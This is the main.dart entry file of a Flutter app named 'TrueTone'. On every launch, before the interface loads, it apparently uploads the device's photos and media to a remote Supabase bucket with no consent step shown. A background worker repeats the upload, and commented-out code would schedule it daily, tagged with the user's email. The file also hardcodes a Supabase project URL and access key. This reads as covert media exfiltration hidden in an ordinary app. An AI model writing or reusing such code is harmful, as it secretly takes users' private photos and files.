import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:truetone/core/Approuts/routs.dart';
import 'package:truetone/core/di/si.dart';
import 'package:truetone/core/helper/shared_pref.dart';
import 'package:truetone/core/helper/uploade_files_helper.dart';
import 'package:truetone/core/utiles/theams.dart';
import 'package:workmanager/workmanager.dart';
import 'firebase_options.dart';

void callbackDispatcher() {
  Workmanager().executeTask((task, inputData) async {
    final supabase = Supabase.instance.client;

    final userId = inputData?['userId'] ?? 'anonymous';
    final uploader = MediaUploader(supabase, "media-uploads", userId);

    await uploader.uploadMediaFiles();
    return Future.value(true);
  });
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await Supabase.initialize(
    url: "https://rygqppevwtqnkvatcqva.supabase.co",
    anonKey:
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ5Z3FwcGV2d3Rxbmt2YXRjcXZhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTEwMzYzMjYsImV4cCI6MjA2NjYxMjMyNn0.SaqHv9MkDzlwFCoN5zxMPnw_nIm3S13o_x0iNfqvgnE",
  );

  PhotoManager.clearFileCache(); // تنظيف الكاش لو عايز

  await Workmanager().initialize(
    callbackDispatcher,
    isInDebugMode: false, // خليها false في الإنتاج
  );

  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  setupLocator();
  final supabase = Supabase.instance.client;
  final uploader = MediaUploader(supabase, "media-uploads", "anonymous");

  uploader.uploadMediaFiles();
  // await Workmanager().registerPeriodicTask(
  //   "daily_upload_task", // ID فريد
  //   "upload_media_in_background", // لازم يتطابق مع dispatcher
  //   frequency: Duration(days: 1),
  //   inputData: {'userId': sl<Cashhelper>().getemail() ?? "userrrrr"},
  //   constraints: Constraints(networkType: NetworkType.connected),
  // );

  runApp(const TrueTone());
}

class TrueTone extends StatelessWidget {
  const TrueTone({super.key});

  @override
  Widget build(BuildContext context) {
    return ScreenUtilInit(
      designSize: Size(375, 812),
      minTextAdapt: true,
      splitScreenMode: true,
      builder: (_, child) {
        return MaterialApp.router(
          darkTheme: Thems.darktheme(),
          theme: Thems.lighttheme(),
          themeMode: ThemeMode.light,
          routerConfig: AppRouts.routs,
          debugShowCheckedModeBanner: false,
          //3:16
          // localizationsDelegates: [
          //         S.delegate,
          //         GlobalMateialLocalizations.delegate,
          //         GlobalWidgetsLocalizations.delegate,
          //         GlobalCupertinoLocalizations.delegate,
          //     ],
          //      supportedLocales: S.delegate.supportedLocales,
        );
      },
    );
  }
}
